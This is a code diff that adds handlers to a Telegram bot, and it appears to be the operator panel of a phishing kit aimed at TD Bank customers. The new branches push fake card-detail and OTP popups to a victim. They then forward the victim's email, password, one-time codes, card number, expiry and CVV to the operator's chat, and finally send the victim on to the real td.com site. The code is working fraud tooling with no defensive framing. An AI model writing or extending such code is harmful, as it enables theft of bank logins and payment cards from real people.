@@ -105,6 +105,62 @@ bot.on('callback_query', async (callbackQuery) => {
       );
       console.log(`[Bot] Triggered OTP popup for ${email}. OTP is ${otp}`);
 
+    } else if (action === 'show_card') {
+      // Trigger card details form on user's screen
+      session.status = 'card_popup';
+      await bot.answerCallbackQuery(callbackQueryId, { text: '💳 Card form triggered!' });
+      await bot.editMessageText(
+        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Triggered card form for ${email}`);
+
+    } else if (action === 'accept_otp_card') {
+      session.status = 'card_popup';
+      await bot.answerCallbackQuery(callbackQueryId, { text: '💳 OTP Accepted — Card popup triggered!' });
+      await bot.editMessageText(
+        `💳 CARD DETAILS REQUESTED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: Waiting for user to enter card details...`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Triggered card popup for ${email}`);
+
+    } else if (action === 'accept_card') {
+      session.status = 'verified';
+      const rawCard = (session.cardNumber || '').replace(/\D/g, '');
+      const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
+      await bot.answerCallbackQuery(callbackQueryId, { text: '✅ Card accepted! Redirecting user...' });
+      await bot.editMessageText(
+        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 Email OTP: ${session.otpEntered || 'N/A'}\n💳 Card: ${formattedCard}\n📅 Expiry: ${session.expiry || 'N/A'}\n🔒 CVV: ${session.cvv || 'N/A'}\n🔢 Card OTP: ${session.cardOtpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Accepted card for ${email}. User redirecting.`);
+
+    } else if (action === 'show_otp_again') {
+      const otp = crypto.randomInt(100000, 999999).toString();
+      session.status = 'show_otp';
+      session.otp = otp;
+      session.otpExpiry = Date.now() + 60000;
+      session.cardOtpMode = true; // flag so frontend shows card-specific OTP subtitle
+
+      await bot.answerCallbackQuery(callbackQueryId, { text: '🔄 Card OTP generated — Card form dismissed' });
+      await bot.editMessageText(
+        `🔄 OTP POPUP RE-TRIGGERED (CARD VERIFICATION)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timeOnly}\nStatus: User must enter card verification code`,
+        {
+          chat_id: message.chat.id,
+          message_id: message.message_id
+        }
+      );
+      console.log(`[Bot] Re-triggered OTP (card mode) for ${email}. New OTP: ${otp}`);
+
     } else if (action === 'cancel') {
       session.status = 'cancelled';
       await bot.answerCallbackQuery(callbackQueryId, { text: '❌ Login attempt cancelled' });
